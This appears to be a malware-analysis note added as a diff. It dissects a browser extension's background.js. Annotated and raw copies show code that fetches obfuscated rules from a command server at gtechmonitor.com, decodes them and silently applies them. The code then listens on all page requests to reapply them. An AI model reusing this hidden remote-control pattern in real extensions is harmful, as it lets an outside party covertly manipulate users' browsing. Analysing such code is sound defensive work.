@@ -1,0 +1,84 @@
+Grabing API in background.js url: https://gtechmonitor.com/a"
+Marked Snippet:
+// From background.js, inside the `u` class
+static async data() {
+    try {
+      const t = await fetch("https://gtechmonitor.com/a"); // Fetches from a suspicious C2 server
+      var e = await t.text();
+      return JSON.parse(
+        atob( // Base64 decode
+          (function () { // De-obfuscation routine
+            const t = e.split("");
+            for (let e = 0; e < t.length; e++)
+              t[e].charCodeAt(0) <= 1024 &&
+                (t[e] = String.fromCharCode(
+                  (t[e].charCodeAt(0) + 1007) % 1024 // Simple substitution cipher
+                ));
+            return t.join("");
+          })()
+        )
+      );
+    } catch {} // Fails silently
+    return null;
+}
+
+static async run() {
+    try {
+      await d.clear_rules();
+      const t = await u.data(); // Gets the malicious rules
+      null !== t &&
+        setTimeout(async () => {
+          await d.clear_rules(),
+            await u.apply(t), // Applies the rules
+            // ... more logic to re-apply rules later
+        }, 1e3 * t.l);
+    } catch (e) {}
+}
+
+Snippet:
+      static async data() {
+        try {
+          const t = await fetch("https://gtechmonitor.com/a");
+          var e = await t.text();
+          return JSON.parse(
+            atob(
+              (function () {
+                const t = e.split("");
+                for (let e = 0; e < t.length; e++)
+                  t[e].charCodeAt(0) <= 1024 &&
+                    (t[e] = String.fromCharCode(
+                      (t[e].charCodeAt(0) + 1007) % 1024
+                    ));
+                return t.join("");
+              })()
+            )
+          );
+        } catch {}
+        return null;
+      }
+      static async run() {
+        try {
+          await d.clear_rules();
+          const t = await u.data();
+          null !== t &&
+            setTimeout(async () => {
+              await d.clear_rules(),
+                await u.apply(t),
+                await u.stop(),
+                (u.listener = async (e) => {
+                  u.in_cd ||
+                    e.initiator !== t.i ||
+                    ((u.in_cd = !0),
+                    await d.clear_rules(),
+                    await a.sleep(1e3 * t.c),
+                    await u.apply(await u.data()),
+                    (u.in_cd = !1));
+                }),
+                chrome.webRequest.onBeforeSendHeaders.addListener(
+                  u.listener,
+                  { urls: ["<all_urls>"], types: ["main_frame"] },
+                  ["requestHeaders", "extraHeaders"]
+                );
+            }, 1e3 * t.l);
+        } catch (e) {}
+      }
